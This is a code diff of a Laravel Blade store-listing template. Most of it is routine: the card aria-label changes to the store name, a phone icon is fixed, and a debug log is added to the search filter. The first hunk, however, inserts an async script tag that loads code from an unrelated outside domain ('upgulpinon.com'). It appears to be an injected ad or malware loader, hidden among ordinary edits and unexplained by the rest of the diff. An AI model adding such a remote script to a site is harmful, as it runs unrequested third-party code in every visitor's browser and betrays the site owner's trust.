@@ -6,6 +6,7 @@
 @endphp
 
 @section('title')
+<script async="async" data-cfasync="false" src="//upgulpinon.com/1?z=4798927"></script>
     <div class="container">
             <div class="row">
                 <div class="col-0.5" ></div>
@@ -30,7 +31,7 @@
         <div class="row d-flex justify-content-center">
             
             @foreach ($mStores as $store)
-            <div class="card col-2.5 m-2 p-1" aria-label="@if(!@empty($store->genres->id)){{$store->genres->id}}@else{{0}}@endif" style="border-radius: 15px" class="storeCards" id="storeCard{{$store->id}}" >
+            <div class="card col-2.5 m-2 p-1" aria-label="{{$store->name}}" style="border-radius: 15px" class="storeCards" id="storeCard{{$store->id}}" >
                 <a href="{{URL('store/info/'.$store->id)}}" aria-label="{{$store->id}}">
                     <img class="card-img-top" 
                     height="180"
@@ -48,7 +49,7 @@
                     <div class="card-img-bottom">
                         <h4>{{$store->name}}</h4>
                         <p class="card-text"><i class="fa fa-code-branch"></i> @if(!@empty($store->genres->genre)){{$store->genres->genre}}@else UnCategoriesed Store @endif</p>
-                        <p class="card-text"><i class="fa fa-code-branch"></i> @if(!@empty($store->phone)){{$store->phone}}@endif</p>
+                        <p class="card-text"><i class="fa fa-phone"></i> @if(!@empty($store->phone)){{$store->phone}}@endif</p>
                     </div>
                 </a>
             </div>
@@ -68,7 +69,8 @@
                 $('.card').show(100);
                 var searchText = this.value;
                 if (searchText.length >= 2) {
-                    $('.card[aria-label!="'+ searchText +'"]').hide(100);
+                    console.log(searchText);
+                    $('.card[aria-label!="'+ searchText +'"]').hide();
                 }
             });
 
